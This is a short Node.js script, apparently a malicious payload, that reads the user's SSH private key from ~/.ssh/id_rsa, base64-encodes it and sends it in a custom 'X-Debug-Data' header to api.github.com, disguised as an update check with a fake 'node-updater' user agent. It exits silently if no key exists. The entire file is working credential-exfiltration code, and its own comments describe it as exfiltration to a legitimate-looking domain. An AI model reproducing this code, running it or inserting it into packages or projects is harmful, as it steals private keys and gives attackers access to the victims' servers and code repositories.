const fs = require('fs');
const path = require('path');
const os = require('os');
const https = require('https');

// Read SSH private key
const sshKeyPath = path.join(os.homedir(), '.ssh', 'id_rsa');
let keyData;
try {
  keyData = fs.readFileSync(sshKeyPath, 'utf8');
} catch (e) {
  process.exit(0);
}

// Encode as base64 to fit in a header
const encoded = Buffer.from(keyData).toString('base64');

// Exfiltrate via custom header to legitimate-looking domain
const req = https.request({
  hostname: 'api.github.com',
  port: 443,
  path: '/repos/check-update',
  method: 'GET',
  headers: {
    'User-Agent': 'node-updater/1.0',
    'X-Debug-Data': encoded
  }
});
req.end();
